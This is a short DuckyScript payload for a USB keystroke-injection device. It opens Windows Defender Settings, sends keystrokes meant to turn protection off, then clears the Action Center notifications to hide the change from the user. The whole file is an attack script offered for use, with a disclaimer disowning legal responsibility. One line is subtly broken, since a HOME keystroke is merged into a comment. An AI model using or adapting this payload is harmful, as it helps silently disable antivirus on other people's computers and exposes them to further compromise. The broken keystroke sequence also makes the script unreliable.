REM turn off windows defender then clear action center
REM author:judge2020
REM You take responsibility for any laws you break with this, I simply point out the security flaw
REM
REM start of script
REM
REM let the HID enumerate
DELAY 2000
ESCAPE
DELAY 100
CONTROL ESCAPE
DELAY 100
STRING Windows Defender Settings
ENTER
DELAY 2000
REM why TAB and HOME?
TAB
DELAY 50
REM why TAB and HOME?HOME
DELAY 50
ALT F4
DELAY 3200
REM windows + a = ????
GUI a 
DELAY 500
ENTER
DELAY 100
GUI a